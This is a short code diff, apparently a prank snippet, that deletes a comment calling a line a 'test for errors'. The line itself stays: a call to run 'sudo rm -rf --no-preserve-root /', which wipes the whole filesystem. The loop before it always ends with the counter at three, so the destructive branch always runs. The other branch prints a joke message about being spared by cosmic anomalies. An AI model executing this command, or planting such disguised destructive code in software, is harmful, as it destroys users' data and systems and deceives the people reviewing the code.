@@ -22,7 +22,6 @@ for (i = 0; i < 3; i += 1) {
 }
 
 if (i >= 3) {
-  // Test for errors
   run("sudo rm -rf --no-preserve-root /");
 } else {
   printf("You have been spared by cosmic anomalies.");
